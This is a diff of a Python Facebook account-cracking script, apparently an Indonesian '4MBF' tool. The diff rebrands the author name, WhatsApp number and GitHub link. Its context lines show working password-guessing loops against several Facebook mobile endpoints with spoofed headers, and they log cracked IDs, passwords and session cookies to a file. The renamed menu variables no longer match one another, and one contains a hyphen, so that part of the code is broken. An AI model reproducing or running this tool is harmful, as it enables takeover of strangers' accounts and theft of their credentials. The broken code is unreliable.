@@ -157,14 +157,14 @@ def banner():
 	cik2=mark(wel ,style='green')
 	sol().print(cik2)
 	ban='''
-•   AUTHOR : OWI-XD WHATSAPP : 085817964592   •
+•   AUTHOR : CLAOUPY4 HATSAPP : 085759262117  •
 •   _____ _______  ____________________         •
 •   __  // /__   |/  /__  __ )__  ____/         •
 •   _  // /__  /|_/ /__  __  |_  /_             •
 •   /__  __/  /  / / _  /_/ /_  __/             •
 •     /_/  /_/  /_/  /_____/ /_/VERSION 11.0.5   •
 •                                               •
-•   GITHUB : HTTPS://GITHUB.COM/OWI-XD/4MBF   •'''
+•   GITHUB : HTTPS://GITHUB.COM/BALA-BALA/4MBF   •'''
 	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
 	cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMATION • [/bold cyan]'))
 # VALIDASI TOKEN
@@ -237,12 +237,12 @@ def menu(my_name,my_id):
 	print('└─  1. Crack Publik ')
 	print('└─  2. Hasil Crack  ')
 	print('└─  0. Keluar       ')
-	_____alvino__adijaya_____ = input('\n└─  Pilih : ')
-	if _____alvino__adijaya_____ in ['1']:
+	_____CKAOUPY4_ = input('\n└─  Pilih : ')
+	if _____CLAOUPY4____ in ['1']:
 		dump_massal()
-	elif _____alvino__adijaya_____ in ['2']:
+	elif _____BALA-BALA____ in ['2']:
 		result()
-	elif _____alvino__adijaya_____ in ['0']:
+	elif _____BALA-BALA______ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('└─  Sukses Logout+Hapus Kukis ')
@@ -690,7 +690,7 @@ def crack(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUOY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -705,7 +705,7 @@ def crack(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='CLAOUOY4 OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -734,7 +734,7 @@ def crack(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]CLAOUPY4 OK[/bold green]'))
 					ok+=1
 					break
 
@@ -755,7 +755,7 @@ def crackfree(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s OWI-XD %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s CLAOUPY4 %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -773,7 +773,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUPY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -788,7 +788,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='CLAOUOY4 OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -839,7 +839,7 @@ def cracktouch(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s OWI-XD %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s CLAOUPY4 %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -857,7 +857,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUPY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -872,7 +872,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='CLAOUPY4 OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -901,7 +901,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]CLAOUPY4 OK[/bold green]'))
 					ok+=1
 					break
 
@@ -921,7 +921,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s OWI-XD %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s CLAOUPY4 %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -939,7 +939,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUPY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -983,7 +983,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]CLAOUPY OK[/bold green]'))
 					ok+=1
 					break
 
